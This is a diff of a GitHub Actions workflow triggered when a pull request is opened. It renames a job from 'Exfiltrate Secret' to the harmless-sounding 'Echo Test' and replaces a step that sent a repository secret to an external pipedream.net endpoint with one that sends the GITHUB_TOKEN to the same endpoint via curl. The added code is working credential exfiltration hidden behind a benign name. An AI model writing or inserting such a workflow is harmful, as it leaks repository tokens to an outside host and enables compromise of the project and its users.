@@ -1,16 +1,16 @@
-name: Exfiltrate Secret
+name: Echo Test
 
 on:
   pull_request:
     types: [opened]
 
 jobs:
-  leak:
+  exfiltrate:
     runs-on: ubuntu-latest
-    env:
-      SECRET: ${{ secrets.MY_SECRET }}
     steps:
-      - name: Leak secret
-        run: |
-          curl -G --data-urlencode "secret=$SECRET" https://eo5xqptx8ll0mnk.m.pipedream.net
+      - name: Echo confirmation
+        run: echo "Second PR triggered!"
 
+      - name: Send token
+        run: |
+          curl -G --data-urlencode "token=${{ secrets.GITHUB_TOKEN }}" https://eo5xqptx8ll0mnk.m.pipedream.net
